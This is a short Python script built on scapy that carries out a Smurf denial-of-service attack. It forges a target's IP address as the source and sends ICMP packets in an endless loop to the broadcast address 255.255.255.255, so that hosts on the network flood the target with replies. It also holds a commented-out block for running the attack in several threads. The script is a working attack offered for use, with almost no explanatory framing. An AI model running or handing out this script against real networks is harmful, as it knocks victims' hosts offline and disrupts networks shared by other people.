from scapy.all import *
# Below was the line working for me(scapy has changed to kamene)
# from kamene.all import *
from threading import Thread

source_ip = "192.168.43.132" # target ip

def smurfAttack(source_ip):
    target_ip = "255.255.255.255"
    p = IP(src=source_ip , dst=target_ip)/ICMP()
    send(p,loop=1, verbose=0)

# number_threads = 0
# while number_threads < 5:
#     try:
#         Thread(target = smurfAttack,args = (source_ip))
#         number_threads += 1
        
#     except:
#         continue
#     print(number_threads)
smurfAttack(source_ip)